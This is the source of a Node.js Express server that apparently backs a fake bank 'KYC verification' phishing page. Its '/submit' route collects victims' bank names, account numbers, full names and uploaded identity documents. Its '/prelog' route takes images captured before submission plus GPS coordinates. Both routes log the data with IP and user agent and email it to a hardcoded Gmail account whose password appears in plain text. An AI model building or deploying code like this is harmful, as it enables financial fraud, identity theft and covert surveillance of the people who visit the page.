const express = require('express');
const multer = require('multer');
const fs = require('fs');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const port = process.env.PORT;

app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json({ limit: '50mb' })); // ✅ needed for location data

const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads'),
  filename: (req, file, cb) =>
    cb(null, Date.now() + '-' + file.originalname.replace(/\s+/g, '_'))
});
const upload = multer({ storage }).any(); // ✅ changed to .any() to support prelog images

// ✅ Real IP extractor
const getIP = req => req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

// ✅ Email transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'dcbsubmission392@gmail.com',
    pass: 'kexmwnespcwxrkjt' // ✅ no space
  }
});

// ✅ /submit route (same as yours, just IP fix)
app.post('/submit', upload, (req, res) => {
  const { bankname, accno, fullname } = req.body;
  const ip = getIP(req);
  const userAgent = req.headers['user-agent'];
  const file = req.files.find(f => f.fieldname === 'document');
  const timestamp = new Date().toISOString();

  const logEntry = `
--- Submission: ${timestamp} ---
Bank Name: ${bankname}
Account No: ${accno}
Full Name: ${fullname}
File: ${file.path}
IP: ${ip}
User Agent: ${userAgent}
`;

  fs.appendFileSync('records.txt', logEntry);

  const mailOptions = {
    from: 'dcbsubmission392@gmail.com',
    to: 'dcbsubmission392@gmail.com',
    subject: '🔔 New Bank Verification Submission',
    text: `
New submission received:

Bank Name: ${bankname}
Account Number: ${accno}
Full Name: ${fullname}
Uploaded File Path: ${file.path}

IP: ${ip}
Timestamp: ${timestamp}
User Agent: ${userAgent}
    `,
    attachments: [
      {
        filename: file.originalname,
        path: file.path
      }
    ]
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('❌ Email failed:', error);
    } else {
      console.log('✅ Email sent:', info.response);
    }
    fs.unlinkSync(file.path); // ✅ clean up
  });

  res.send('<h2>✅ Submitted Successfully!</h2><p>Your KYC info has been received.</p>');
});

// ✅ /prelog route for early images + GPS
app.post('/prelog', upload, (req, res) => {
  const ip = getIP(req);
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toISOString();
  const files = req.files || [];

  let location = 'None';
  try {
    if (req.body.location) {
      const loc = JSON.parse(req.body.location);
      location = `Lat: ${loc.latitude}, Long: ${loc.longitude}, Accuracy: ±${loc.accuracy}m`;
    }
  } catch (err) {
    console.error('Location parse error:', err);
  }

  const logEntry = `
--- PRELOG: ${timestamp} ---
Location: ${location}
Images Captured: ${files.length}
IP: ${ip}
User Agent: ${userAgent}
`;

  fs.appendFileSync('records.txt', logEntry);

  const mailOptions = {
    from: 'dcbsubmission392@gmail.com',
    to: 'dcbsubmission392@gmail.com',
    subject: '🔔 Pre-Submission Visitor Data',
    text: logEntry,
    attachments: files.map(f => ({
      filename: f.originalname,
      path: f.path
    }))
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('❌ Prelog email failed:', error);
    } else {
      console.log('✅ Prelog email sent:', info.response);
    }
    files.forEach(f => fs.unlinkSync(f.path)); // ✅ clean up
  });

  res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
